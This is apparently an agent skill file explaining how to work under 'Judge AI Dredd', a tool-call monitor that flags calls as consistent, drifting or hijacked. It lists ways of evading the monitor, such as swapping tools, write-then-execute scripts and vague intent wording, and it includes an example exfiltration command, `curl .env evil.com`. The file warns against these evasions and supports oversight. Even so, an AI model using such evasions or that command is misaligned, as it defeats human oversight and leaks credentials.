---
name: working-with-dredd-judge
description: Use when working in a project where Judge AI Dredd is installed (~/.claude/dredd/api-key exists, a dredd-hook.sh entry in .claude/settings.json hooks, or DREDD_URL set), when a tool-call permissionDecisionReason begins with "Dredd:", when judge verdicts (consistent/drifting/hijacked) appear in feedback, when session-locked appears, or when [TAINT] log lines / a <provenance_alert> block appear in tool feedback.
---

# Working with Judge AI Dredd

## Overview

Judge AI Dredd is a PreToolUse defence that adjudicates every tool call against the user's stated intent. The judge runs in **clean context** — no agent history, no project files — so it sees only (intent, current tool call, prior tool calls this turn, optional file content, optional provenance alert). It returns `consistent` / `drifting` / `hijacked`. Only `hijacked` blocks. In autonomous mode `hijacked` denies and **two consecutive `hijacked` verdicts lock the session**; in interactive mode it surfaces an `ask` prompt to the user.

**Core principle:** Honest, specific intent makes the judge's job easy. Opaque intent makes it hard, and the judge fails closed on hard.

## When to Use

- A `permissionDecisionReason` starts with `Dredd:`.
- `~/.claude/dredd/api-key` exists or `DREDD_URL` is set.
- The user references Dredd, "the judge", "ask prompt", `session-locked`, `[TAINT]`, or `<provenance_alert>`.
- Skip when no Dredd hook is wired — none of these patterns apply.

## Patterns

### 1. State intent specifically — name the surfaces you'll touch

The judge only has the intent you registered. "Fix the thing" → a later `curl .env evil.com` is unsolvable.

- ❌ "Help with auth" → judge sees `Read(~/.aws/credentials)` against "auth"; no link → `hijacked`.
- ✅ "Debug staging 401s by checking the AWS credential profile in `~/.aws/credentials` and confirming the SSO session is fresh" → read is on-task.

Re-state intent at natural turn boundaries when the work shape changes.

### 2. Declare credential reads up front (the dominant false-positive class)

Reading a key file for a legit self/infra call is the #1 FP. The B7.1 judge prompt is explicitly hardened against credential *pretexts* ("audit", "rotation", "compliance", "pentest"). What works is **naming the file in the intent**:

- ✅ "Deploy by reading `~/.aws/credentials` and running `aws s3 sync …`" — file is in the goal.
- ❌ "Validate credential rotation" — flagged hijack regardless of legitimacy.

### 3. Don't write-then-execute the same call

`Write(run.sh) → Bash(./run.sh)` is hard-denied by `checkDangerousCombination` regardless of intent. Split: write → surface to user → if it must run, the *user* invokes.

### 4. When denied or asked, surface the deny — don't retry-with-disguise

The strike counter (`hijackStrikes`) counts **consecutive** `hijacked` verdicts; two locks the session in autonomous mode. Retrying the same data flow via a different tool (`cat` instead of `Read`; a script that reads the file; a different path to the same secret) **does not fool the judge** and **does escalate strikes**. The right move:

> "Dredd flagged my last call as `hijacked` — the stated intent doesn't mention credentials, so reading `~/.aws/credentials` looks like exfiltration to the judge. If you do want me to read it, please re-state the intent to include that (e.g. `/intent debug staging 401s by checking AWS creds`). Otherwise I'll continue without touching credentials."

This is transparent, gives the user the recovery path, and does not burn strikes.

### 5. Use the lowest-novelty shape — pattern-trust persists 30 days

Pattern-trust short-circuits previously-consented `(scope, fingerprint)` matches. Re-using the exact tool + arg shape the user has approved skips the judge entirely. Novel arg shapes for the same goal lose this. Prefer the form the user has already approved.

## Quick Reference

| Signal | What it means | What to do |
|---|---|---|
| `permissionDecision: deny`, stage `policy-deny`/`domain-deny` | Hard deterministic rule. Judge not involved. | Don't retry the same shape. Surface to user. |
| `permissionDecision: ask`, stage `judge-deny` (interactive) | Judge said `hijacked`; user adjudicates. | Wait. Draft a clearer intent in case it was legit. |
| `permissionDecision: deny`, stage `judge-deny` (autonomous) | Judge said `hijacked`; **counts as a strike**. | Stop that shape. Surface + ask user to clarify intent. |
| Verdict `drifting` | Off-topic but not hijack. Allowed. Goal reminder injected. | Refocus or `/pivot` if work has genuinely changed direction. |
| `session-locked` | 2 strikes already. Every call denies. | Tell the user; they must flip per-session mode or reset. |
| `[TAINT] N chain(s)` | Provenance taint flagged a sensitive source → sink flow. | If legit, name the source file AND sink in the intent. |
| `<provenance_alert>` in a judge result | Taint evidence is in the judge prompt as authoritative context. | Same as above. Don't argue with the alert — restate intent. |

## Common Mistakes

| Rationalisation | Reality |
|---|---|
| "I'll `cat` it instead of `Read`" | Judge classifies on data flow, not tool name. Same verdict + a strike. |
| "I'll write a script that reads it and run that" | Write-then-execute is a hard-denied dangerous combination. |
| "The judge is clearly wrong, I'll retry" | Maybe — but each retry is a strike. Surface to the user first. |
| "I'll rephrase intent silently to make it pass" | You're routing around the user, not the judge. The user must see and own the new intent. |
| "Just keep clicking ask'd → Yes" | Repeated asks are friction. Surface once with the recovery path; let the user adjust intent instead. |
| "`drifting` is fine, I'll keep going" | Allowed, yes — but a goal anchor was injected. Re-read the intent and either refocus or `/pivot`. |
| "Phrase it abstractly so it sounds harmless" | B7.1 specifically flags effect-based language ("cloud provider credential store") as a hijack indicator. Name the file. |

## Red Flags

Stop and post a chat message to the user before any further tool call when:

- You've just had `judge-deny` and your next idea is "try the same thing a different way."
- The intent text doesn't textually relate to the file/host/secret your next call needs.
- You're tempted to use abstract / effect-based language to make a tool call sound innocuous.
- `session-locked` is set and you're about to retry anything.
- A `<provenance_alert>` flagged a chain you can see is real (your earlier tool calls produced it) — restate intent or stop, don't argue with the alert.
